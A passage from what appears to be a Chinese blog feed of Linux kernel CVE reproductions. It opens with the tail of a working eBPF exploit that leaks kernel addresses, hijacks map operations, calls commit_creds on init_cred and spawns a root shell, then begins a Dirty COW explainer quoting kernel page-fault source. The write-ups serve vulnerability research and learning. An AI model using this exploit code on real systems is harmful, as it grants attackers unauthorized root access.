kernel_base);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;kernel_offset =&gt; %p\n&quot;</span>, kernel_offset);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;work_for_cpu_fn =&gt; %p\n&quot;</span>, work_for_cpu_fn_addr);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;commit_creds_addr =&gt; %p\n&quot;</span>, commit_creds_addr);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;init_creds_addr =&gt; %p\n&quot;</span>, init_creds_addr);</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">bpf_insn</span> <span class="title">read_map_addr_ops</span>[] =</span> &#123;</span><br><span class="line">        attack(map_fd, map_fd2),</span><br><span class="line">        BPF_ALU64_IMM(BPF_MUL, BPF_REG_6, <span class="number">0x50</span>),</span><br><span class="line">        BPF_ALU64_REG(BPF_SUB, BPF_REG_9, BPF_REG_6),</span><br><span class="line">        BPF_LDX_MEM(BPF_DW, BPF_REG_0, BPF_REG_9, <span class="number">0</span>),</span><br><span class="line">        BPF_STX_MEM(BPF_DW, BPF_REG_8, BPF_REG_0, <span class="number">8</span>),</span><br><span class="line">        BPF_EXIT_INSN()&#125;;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="number">0</span> != run_bpf_prog(read_map_addr_ops, <span class="keyword">sizeof</span>(read_map_addr_ops) / <span class="keyword">sizeof</span>(struct bpf_insn), <span class="number">1</span>, <span class="literal">NULL</span>))</span><br><span class="line">        err_exit(<span class="string">&quot;[-] Failed to run bpf program\n&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (<span class="number">0</span> != lookup_map_element(map_fd, <span class="number">0</span>, values))</span><br><span class="line">        err_exit(<span class="string">&quot;[-] Failed to lookup map element\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">uint64_t</span> map_ptr = *(<span class="keyword">uint64_t</span> *)(values + <span class="number">8</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;map_ptr =&gt; %p\n&quot;</span>, map_ptr);</span><br><span class="line">    <span class="keyword">uint64_t</span> map_value = map_ptr - <span class="number">0xc0</span> + <span class="number">0x110</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;map_value =&gt; %p\n&quot;</span>, map_value);</span><br><span class="line"></span><br><span class="line">    read_kernel(map_fd, map_fd2, map_ptr, values, <span class="number">0x8</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%p\n&quot;</span>, *(<span class="keyword">uint64_t</span> *)values);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">memset</span>(values, <span class="number">0</span>, <span class="number">0x1000</span>);</span><br><span class="line">    read_kernel(map_fd, map_fd2, array_map_ops, values, <span class="number">0xf0</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">char</span> map_ops[<span class="number">0x1000</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    *(<span class="keyword">uint64_t</span> *)(values + <span class="number">8</span> * <span class="number">4</span>) = work_for_cpu_fn_addr;</span><br><span class="line">    <span class="built_in">memcpy</span>(map_ops, values, <span class="number">0xf0</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="number">0</span> != update_map_element(map_fd2, <span class="number">0</span>, map_ops, BPF_ANY))</span><br><span class="line">        err_exit(<span class="string">&quot;[-] failed to update map element values!\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">bpf_insn</span> <span class="title">modify_oob_map</span>[] =</span></span><br><span class="line">        &#123;</span><br><span class="line">            attack(map_fd, map_fd2),</span><br><span class="line">            BPF_ALU64_IMM(BPF_MUL, BPF_REG_6, <span class="number">0x110</span>),</span><br><span class="line">            BPF_ALU64_REG(BPF_SUB, BPF_REG_9, BPF_REG_6),</span><br><span class="line">            BPF_LDX_MEM(BPF_DW, BPF_REG_0, BPF_REG_8, <span class="number">0x8</span>),</span><br><span class="line">            BPF_LDX_MEM(BPF_DW, BPF_REG_1, BPF_REG_8, <span class="number">0x10</span>),</span><br><span class="line">            BPF_LDX_MEM(BPF_DW, BPF_REG_2, BPF_REG_8, <span class="number">0x18</span>),</span><br><span class="line">            BPF_STX_MEM(BPF_DW, BPF_REG_9, BPF_REG_0, <span class="number">0x20</span>),</span><br><span class="line">            BPF_STX_MEM(BPF_DW, BPF_REG_9, BPF_REG_1, <span class="number">0x28</span>),</span><br><span class="line">            BPF_STX_MEM(BPF_DW, BPF_REG_9, BPF_REG_2, <span class="number">0</span>),</span><br><span class="line">            BPF_EXIT_INSN()&#125;;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">memset</span>(values, <span class="number">0</span>, <span class="number">0x1000</span>);</span><br><span class="line">    *(<span class="keyword">uint64_t</span> *)(values + <span class="number">0x8</span>) = commit_creds_addr;</span><br><span class="line">    *(<span class="keyword">uint64_t</span> *)(values + <span class="number">0x10</span>) = init_creds_addr;</span><br><span class="line">    *(<span class="keyword">uint64_t</span> *)(values + <span class="number">0x18</span>) = map_value;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="number">0</span> != update_map_element(map_fd, <span class="number">0</span>, values, BPF_ANY))</span><br><span class="line">        err_exit(<span class="string">&quot;[-] failed to update map element values!\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="number">0</span> != run_bpf_prog(modify_oob_map, <span class="keyword">sizeof</span>(modify_oob_map) / <span class="keyword">sizeof</span>(struct bpf_insn), <span class="number">1</span>, <span class="literal">NULL</span>))</span><br><span class="line">        err_exit(<span class="string">&quot;[-] Failed to run bpf program\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> key = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> next_key;</span><br><span class="line">    <span class="class"><span class="keyword">union</span> <span class="title">bpf_attr</span> <span class="title">attr</span> =</span> &#123;</span><br><span class="line">        .map_fd = map_fd2,</span><br><span class="line">        .key = &amp;key,</span><br><span class="line">        .next_key = &amp;next_key&#125;;</span><br><span class="line">    map_get_next_key(&amp;attr);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[+] commit_cred(&amp;init_cred) done!\n&quot;</span>);</span><br><span class="line">    get_shell();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img   src="/images/image-20230812203539165.png"  alt="image-20230812203539165"></p><h2 id="值得注意的"><a href="#值得注意的" class="headerlink" title="值得注意的"></a>值得注意的</h2><p>在linux kernel 5.11.16版本以后的 ALU sanitation 机制发生了改变，一是<code>alu_limit</code>计算方法变了，不再用指针寄存器的位置来计算，而是使用offset寄存器。例如，假设有个寄存器的无符号边界是 <code>umax_value = 1, umin_value = 0</code>，则计算出 <code>alu_limit = 1</code>，表示如果该寄存器在运行时超出边界，则指针运算不会使用该寄存器。二是在runtime时会用立即数替换掉 <code>verifier</code> 认定为常数的寄存器。例如，<code>BPF_ALU64_REG(BPF_ADD, BPF_REG_2, EXPLOIT_REG)</code> ，<code>EXPLOIT_REG</code>被verifier认定为0，但运行时为1，则将该指令改为 <code>BPF_ALU64_IMM(BPF_ADD, BPF_REG_2, 0)</code>。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">bool</span> off_is_imm = tnum_is_const(off_reg-&gt;var_off);</span><br><span class="line">alu_state |= off_is_imm ? BPF_ALU_IMMEDIATE : <span class="number">0</span>;</span><br><span class="line">isimm = aux-&gt;alu_state &amp; BPF_ALU_IMMEDIATE;</span><br><span class="line"><span class="comment">// ... ...</span></span><br><span class="line"><span class="keyword">if</span> (isimm) &#123;</span><br><span class="line">        *patch++ = BPF_MOV32_IMM(BPF_REG_AX, aux-&gt;alu_limit);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">         <span class="comment">// Patch alu_limit check instructions</span></span><br><span class="line">         <span class="comment">// ... ...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><hr><p>参考链接:</p><p>​<a class="link"   href="https://elixir.bootlin.com/linux/v5.11.16/source" >https://elixir.bootlin.com/linux/v5.11.16/source<i class="fas fa-external-link-alt"></i></a></p><p>​<a class="link"   href="https://www.anquanke.com/post/id/251933#h2-1" >https://www.anquanke.com/post/id/251933#h2-1<i class="fas fa-external-link-alt"></i></a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;最近为了找工作疯狂复现CVE是真的太难了😭，今天才发现我工位旁边的居然是fmyy爷😭，属于是给跪了。&lt;/p&gt;
&lt;p&gt;这次复现的这个CVE</summary>
      
    
    
    
    <category term="Linux Kernel" scheme="https://196082.github.io/categories/Linux-Kernel/"/>
    
    <category term="CVE复现" scheme="https://196082.github.io/categories/Linux-Kernel/CVE%E5%A4%8D%E7%8E%B0/"/>
    
    
    <category term="ebpf" scheme="https://196082.github.io/tags/ebpf/"/>
    
  </entry>
  
  <entry>
    <title>CVE-2016-5195复现</title>
    <link href="https://196082.github.io/2023/08/08/CVE-2016-5195/"/>
    <id>https://196082.github.io/2023/08/08/CVE-2016-5195/</id>
    <published>2023-08-08T02:46:43.000Z</published>
    <updated>2023-11-29T10:11:05.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>CVE-2016-5195就是非常出名的<code>Dirty COW</code>，俗称<code>脏牛漏洞</code>。攻击者可以通过Linux Kernel中的COW ( copy-on-write )机制利用条件竞争实现越权对文件读写。</p><p>此漏洞自从Linux Kernel 2.6.22版本就存在，直到2018年Linux Kernel 4.8.3, 4.7.9, 4.4.26版本才被修复。其实这一个CVE应当是一个初学者复现的第一个CVE的，但是可笑的是我是知道今年四五月份时阿里实习生二面的时候才听说过，所以被狠狠的刷了。然而作为一条懒狗我也是硬拖到现在才进行复现，然而在之前我尝试过复现一次不过因为电脑性能跑不出poc就放弃了，因为最近又要开始各种面试所以又要开始学习很多东西了。</p><h2 id="COW机制"><a href="#COW机制" class="headerlink" title="COW机制"></a>COW机制</h2><h3 id="basic-COW"><a href="#basic-COW" class="headerlink" title="basic COW"></a>basic COW</h3><p>COW 即 <code>copy on write</code>：目的是为了降低系统的开销，在一个进程通过<code>fork()</code>创建一个子进程时，并不会直接将父进程的所有地址空间的所有内容复制再分配给子进程。而实际的机制为<strong>父进程与子进程共享所有的页框，而不是直接给子进程分配新的页框，只有当其中任意一方尝试向页框写入内容时内核才会为其分配页框，并将原本内框的内容复制过去</strong>。</p><ol><li>在<code>fork()</code>系统调用后，父子进程会共享所有的页框，内核将所有的页框定义为<code>read-only</code>。</li><li>由于所有页框都是只读的权限，当其中任意一方尝试修改页框时便会触发缺页异常，此时内核会为其分配新的页框。</li></ol><p><img   src="/images/image-20230807101650345.png"  alt="image-20230807101650345"></p><p><img   src="/images/image-20230807101734100.png"  alt="image-20230807101734100"></p><p><img   src="/images/image-20230807101837765.png"  alt="image-20230807101837765"></p><p>以上就是写时复制的基本流程，大大的减少了系统的开销。</p><h3 id="mmap-与-COW"><a href="#mmap-与-COW" class="headerlink" title="mmap 与 COW"></a>mmap 与 COW</h3><p>在上文中想必各位都看到了一个非常熟悉的词<code>缺页异常</code>，其实在原先的文章中我们已经遇到过了缺页异常也是常用的<code>userfaultfd</code>机制。然而当时我们创建的是<code>PROT_READ|PROT_WRITE</code>，当我们映射一个只有读权限的文件，若是我们此时向映射中写入内容时同样会触发写时复制的机制，将文件内容拷贝到内存中，此时进程对这块区域的读写便不会影响磁盘中的文件了。</p><h2 id="缺页异常-write"><a href="#缺页异常-write" class="headerlink" title="缺页异常&amp;write"></a>缺页异常&amp;write</h2><p>在以前写过的<code>userfaultfd</code>这一利用方法的时候并没有分析过缺页异常的原理更别提源码分析了，所以这次正好写一下。</p><p>在CPU中使用MMU进行虚拟内存和物理内存之间的映射，然而在系统中并不是所有的虚拟内存页面都有对应的物理内存页，当软件试图访问已经被映射在虚拟内存中，但是并没有被加载到物理内存中的一个分页时，MMU无法完成由虚拟内存到物理内存之间的转化，此时便会产生<strong>缺页异常</strong>。</p><h3 id="分类"><a href="#分类" class="headerlink" title="分类"></a>分类</h3><p>那么触发缺页异常主要有以下三种情况：</p><ol><li>线性地址不在虚拟地址空间中</li><li>线性地址在虚拟地址空间中，但是权限不够</li><li>线性地址在虚拟地址空间中，但是没有与物理地址之间建立映射</li></ol><p>其类型主要分为以下三种：</p><ol><li><p>软性缺页异常</p><p>软性缺页异常指的是相关页已经被载入到了内存中，但是并没有在MMU中注册，此时只需要向MMU注册相关的物理页即可。</p><p>主要出现在以下两种情况：</p><ol><li>两个进程共享相同的物理页框，内核为其中一个注册了物理页，但是没有为另外一个注册</li><li>该页已经被CPU的工作集中移除，但是尚未交换到磁盘上，若是程序重新使用该页则另需向MMU注册</li></ol></li><li><p>硬性缺页异常</p><p>硬性缺页异常则意味着使用的页并没有被载入到内存中，此时操作系统则需要讲一个合适并且空闲的物理页载入进内存中，随后向该页中写入内容，并在MMU中注册。硬性缺页异常的开销极大，因此部分操作系统也会采取延迟页载入的策略——只有到万不得已时才会分配新的物理页，这也是 Linux 内核的做法。若是频繁地发生硬性缺页异常则会引发系统颠簸，因资源耗尽而无法正常完成工作。</p></li><li><p>无效缺页异常</p><p>意味着进程访问了一个无效的内存地址，此时kernel会向进程发送<code>SIGSEGV</code>信号。</p></li></ol><h3 id="处理缺页异常"><a href="#处理缺页异常" class="headerlink" title="处理缺页异常"></a>处理缺页异常</h3><p>针对文本的缺页异常处理的流程如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">__do_page_fault() =&gt; __handle_mm_fault() =&gt; handle_pte_fault() =&gt; do_fault() =&gt; do_read_fault()/do_ww_fault()/do_shared_fault()</span><br></pre></td></tr></table></figure><p>从头往后看，首先看<code>__do_page_fault</code>函数。</p><h4 id="do-page-fault"><a href="#do-page-fault" class="headerlink" title="__do_page_fault"></a><strong>__do_page_fault</strong></h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> noinline <span class="keyword">void</span></span><br><span class="line">__do_page_fault(struct pt_regs *regs, <span class="keyword">unsigned</span> <span class="keyword">long</span> error_code,</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> address)</span><br><span class="line">&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">vm_area_struct</span> *<span class="title">vma</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">task_struct</span> *<span class="title">tsk</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">mm_struct</span> *<span class="title">mm</span>;</span></span><br><span class="line"><span class="keyword">int</span> fault, major = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> flags = FAULT_FLAG_ALLOW_RETRY | FAULT_FLAG_KILLABLE;</span><br><span class="line"></span><br><span class="line">tsk = current;</span><br><span class="line">mm = tsk-&gt;mm;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Detect and handle instructions that would cause a page fault for</span></span><br><span class="line"><span class="comment"> * both a tracked kernel page and a userspace page.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">if</span> (kmemcheck_active(regs))</span><br><span class="line">kmemcheck_hide(regs);</span><br><span class="line">prefetchw(&amp;mm-&gt;mmap_sem);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (unlikely(kmmio_fault(regs, address)))</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * We fault-in kernel-space virtual memory on-demand. The</span></span><br><span class="line"><span class="comment"> * &#x27;reference&#x27; page table is init_mm.pgd.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * NOTE! We MUST NOT take any locks for this case. We may</span></span><br><span class="line"><span class="comment"> * be in an interrupt or a critical region, and should</span></span><br><span class="line"><span class="comment"> * only copy the information from the master page table,</span></span><br><span class="line"><span class="comment"> * nothing more.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * This verifies that the fault happens in kernel space</span></span><br><span class="line"><span class="comment"> * (error_code &amp; 4) == 0, and that the fault was not a</span></span><br><span class="line"><span class="comment"> * protection error (error_code &amp; 9) == 0.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">if</span> (unlikely(fault_in_kernel_space(address))) &#123;</span><br><span class="line"><span class="keyword">if</span> (!(error_code &amp; (PF_RSVD | PF_USER | PF_PROT))) &#123;</span><br><span class="line"><span class="keyword">if</span> (vmalloc_fault(address) &gt;= <span class="number">0</span>)</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (kmemcheck_fault(regs, address, error_code))</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Can handle a stale RO-&gt;RW TLB: */</span></span><br><span class="line"><span class="keyword">if</span> (spurious_fault(error_code, address))</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* kprobes don&#x27;t want to hook the spurious faults: */</span></span><br><span class="line"><span class="keyword">if</span> (kprobes_fault(regs))</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Don&#x27;t take the mm semaphore here. If we fixup a prefetch</span></span><br><span class="line"><span class="comment"> * fault we could otherwise deadlock:</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">bad_area_nosemaphore(regs, error_code, address);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* kprobes don&#x27;t want to hook the spurious faults: */</span></span><br><span class="line"><span class="keyword">if</span> (unlikely(kprobes_fault(regs)))</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (unlikely(error_code &amp; PF_RSVD))</span><br><span class="line">pgtable_bad(regs, error_code, address);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (unlikely(smap_violation(error_code, regs))) &#123;</span><br><span class="line">bad_area_nosemaphore(regs, error_code, address);</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * If we&#x27;re in an interrupt, have no user context or are running</span></span><br><span class="line"><span class="comment"> * in a region with pagefaults disabled then we must not take the fault</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">if</span> (unlikely(faulthandler_disabled() || !mm)) &#123;</span><br><span class="line">bad_area_nosemaphore(regs, error_code, address);</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * It&#x27;s safe to allow irq&#x27;s after cr2 has been saved and the</span></span><br><span class="line"><span class="comment"> * vmalloc fault has been handled.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * User-mode registers count as a user access even for any</span></span><br><span class="line"><span class="comment"> * potential system fault or CPU buglet:</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">if</span> (user_mode(regs)) &#123;</span><br><span class="line">local_irq_enable();</span><br><span class="line">error_code |= PF_USER;</span><br><span class="line">flags |= FAULT_FLAG_USER;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="keyword">if</span> (regs-&gt;flags &amp; X86_EFLAGS_IF)</span><br><span class="line">local_irq_enable();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">perf_sw_event(PERF_COUNT_SW_PAGE_FAULTS, <span class="number">1</span>, regs, address);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (error_code &amp; PF_WRITE)</span><br><span class="line">flags |= FAULT_FLAG_WRITE;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * When running in the kernel we expect faults to occur only to</span></span><br><span class="line"><span class="comment"> * addresses in user space.  All other faults represent errors in</span></span><br><span class="line"><span class="comment"> * the kernel and should generate an OOPS.  Unfortunately, in the</span></span><br><span class="line"><span class="comment"> * case of an erroneous fault occurring in a code path which already</span></span><br><span class="line"><span class="comment"> * holds mmap_sem we will deadlock attempting to validate the fault</span></span><br><span class="line"><span class="comment"> * against the address space.  Luckily the kernel only validly</span></span><br><span class="line"><span class="comment"> * references user space from well defined areas of code, which are</span></span><br><span class="line"><span class="comment"> * listed in the exceptions table.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * As the vast majority of faults will be valid we will only perform</span></span><br><span class="line"><span class="comment"> * the source reference check when there is a possibility of a</span></span><br><span class="line"><span class="comment"> * deadlock. Attempt to lock the address space, if we cannot we then</span></span><br><span class="line"><span class="comment"> * validate the source. If this is invalid we can skip the address</span></span><br><span class="line"><span class="comment"> * space check, thus avoiding the deadlock:</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">if</span> (unlikely(!down_read_trylock(&amp;mm-&gt;mmap_sem))) &#123;</span><br><span class="line"><span class="keyword">if</span> ((error_code &amp; PF_USER) == <span class="number">0</span> &amp;&amp;</span><br><span class="line">    !search_exception_tables(regs-&gt;ip)) &#123;</span><br><span class="line">bad_area_nosemaphore(regs, error_code, address);</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line">retry:</span><br><span class="line">down_read(&amp;mm-&gt;mmap_sem);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * The above down_read_trylock() might have succeeded in</span></span><br><span class="line"><span class="comment"> * which case we&#x27;ll have missed the might_sleep() from</span></span><br><span class="line"><span class="comment"> * down_read():</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">might_sleep();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">vma = find_vma(mm, address);</span><br><span class="line"><span class="keyword">if</span> (unlikely(!vma)) &#123;</span><br><span class="line">bad_area(regs, error_code, address);</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (likely(vma-&gt;vm_start &lt;= address))</span><br><span class="line"><span class="keyword">goto</span> good_area;</span><br><span class="line"><span class="keyword">if</span> (unlikely(!(vma-&gt;vm_flags &amp; VM_GROWSDOWN))) &#123;</span><br><span class="line">bad_area(regs, error_code, address);</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (error_code &amp; PF_USER) &#123;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Accessing the stack below %sp is always a bug.</span></span><br><span class="line"><span class="comment"> * The large cushion allows instructions like enter</span></span><br><span class="line"><span class="comment"> * and pusha to work. (&quot;enter $65535, $31&quot; pushes</span></span><br><span class="line"><span class="comment"> * 32 pointers and then decrements %sp by 65535.)</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">if</span> (unlikely(address + <span class="number">65536</span> + <span class="number">32</span> * <span class="keyword">sizeof</span>(<span class="keyword">unsigned</span> <span class="keyword">long</span>) &lt; regs-&gt;sp)) &#123;</span><br><span class="line">bad_area(regs, error_code, address);</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (unlikely(expand_stack(vma, address))) &#123;</span><br><span class="line">bad_area(regs, error_code, address);</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Ok, we have a good vm_area for 